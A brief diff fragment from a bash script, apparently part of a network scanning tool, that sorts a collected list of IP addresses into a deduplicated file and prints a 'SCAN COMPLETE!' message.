+sort -u $LOOT_DIR/ips/ips-all-unsorted.txt 2> /dev/null > $LOOT_DIR/ips/ips-all-sorted.txt 2> /dev/null
 
 echo -e "${OKGREEN}====================================================================================${RESET}"
 echo -e "$OKRED SCAN COMPLETE! $RESET"
